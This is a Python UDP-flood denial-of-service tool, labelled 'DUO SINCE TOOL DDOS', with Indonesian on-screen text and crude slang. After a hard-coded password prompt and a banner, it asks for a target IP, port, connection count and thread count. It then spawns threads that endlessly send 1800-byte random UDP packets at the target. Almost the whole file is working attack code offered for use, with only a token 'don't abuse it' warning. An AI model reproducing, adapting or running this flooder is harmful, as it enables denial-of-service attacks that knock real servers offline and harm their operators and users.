import random
import socket
import threading
import time
import os

os.system("cls")
#login tools
password ="DuoSince"

for i in range(3):
	pwd = input(" \u001b[32m#Pasword :\u001b[31m ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print(" #Tunggu Sebentar Tod!!!\u001b[34m ")
		break
	else:
		time.sleep(5)
		print(" #Pasword Salah Goblk!!!\u001b[31m ")
		continue
time.sleep(5)
print("\u001b[31m# Berhasil Masuk Ke \u001b[32mDevXyZ")
time.sleep(5)

print("""
\u001b[32m
           LU JANGAN ABUSE YA TOD!!!!
           DUO SINCE TOOL DDOS
         _____           __   __     ______
        |  __ \          \ \ / /    |___  /
        | |  | | _____   _\ V /_   _   / / 
        | |  | |/ _ \ \ / /> <| | | | / /  
        | |__| |  __/\ V // . | |_| |/ /__ 
        |_____/ \___| \_//_/ \_\__, /_____|
                                __/ |      
                               |___/       
""")

ip = str(input("   \u001b[37mB \u001b[31m<DevXyZ> \u001b[32m>Ip/Host :\u001b[34m  "))
time.sleep(3)
print(" ")
port = int(input("   \u001b[37mA \u001b[31m<DevXyZ> \u001b[32mPort Server :\u001b[34m  "))
print(" ")
times = int(input("   \u001b[37mB \u001b[31m<DevXyZ> \u001b[32mConnections :\u001b[34m  "))
print(" ")
threads = int(input("   \u001b[37mI \u001b[31m<DevXyZ> \u001b[32mThreading :\u001b[34m  "))
print(" ")
print(f"@DevXyZ===> Menghubungkan ke ip {ip} port {port}")
time.sleep(3)

# Attack
def wt():
	data = random._urandom(1800)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(f"\u001b[36m [-] >> Since >>>>> \u001b[35mMengocok Ip \u001b[32m{ip} \u001b[36mCrot Dimuka Port \u001b[34m{port}")
			print(f"\u001b[36m [/] >> Since >>>>> \u001b[35mMengocok ip \u001b[32m{ip}")
		except:
			print(f"\u001b[36m [/] >> Since >>>>> \u001b[35mMengocok Ip \u001b[32m{ip} \u001b[36mCrot Dimuka Port \u001b[34m{port}")

# Threads
for y in range(threads):
	th = threading.Thread(target = wt)
	th.start()